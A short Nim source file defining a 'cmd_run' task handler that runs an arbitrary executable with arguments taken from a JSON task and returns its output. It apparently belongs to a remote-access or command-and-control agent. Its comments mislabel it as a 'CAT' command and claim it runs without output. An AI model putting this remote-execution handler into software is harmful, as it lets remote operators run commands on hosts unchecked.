# This is the source for the CAT command
import ../structs
import ../utils
import json
from osproc import execProcess, poUsePath
from os import parseCmdLine

#[
Executes a executable on the system - blindly, without output

{
  "executable": "path/to/executable",
  "arguments":"argumentsa"
}

]#
proc cmd_run*(task: Task): seq[TaskResponse] {.cdecl.} =

  let params = parseJson(task.parameters)
  let exe = params["executable"].getStr()
  let args = params["arguments"].getStr()

  # Configure Output
  var
    output = ""
    status = ""

  # Do the Magic
  try:
    output = execProcess(exe, args=parseCmdLine(args), options={poUsePath})
  except:
    status = "error"

  # return the response
  return buildReturnData(task.id, output, status)

